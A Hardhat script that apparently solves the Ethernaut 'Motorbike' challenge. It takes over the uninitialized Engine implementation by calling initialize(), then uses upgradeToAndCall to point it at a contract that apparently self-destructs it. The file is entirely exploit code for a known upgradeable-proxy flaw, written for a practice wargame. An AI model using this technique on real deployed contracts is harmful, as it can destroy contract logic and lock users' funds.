import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const bike = await helper.getContractAt("Motorbike", "0xce06F4B6a367550256c30C3Eaf3cade6606282d6");
    const engine = await helper.getContractAt("Engine", "0x0629e49f89fc4b5b0094ca978e4ade2387437aa8");
    const kms = await helper.deployContract("kmsMyself");
    const kmsData = kms.interface.encodeFunctionData('_kms()');
    const data = engine.interface.encodeFunctionData("upgradeToAndCall", [kms.address, kmsData]);

    await helper.waitForTx(engine.initialize());
    console.log(await engine.upgrader());

    await helper.waitForTx(account.sendTransaction({
        to: engine.address,
        data: data
    }));
    await helper.waitForTx(kms.checkAlive(engine.address));
    console.log(await kms.alive());
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });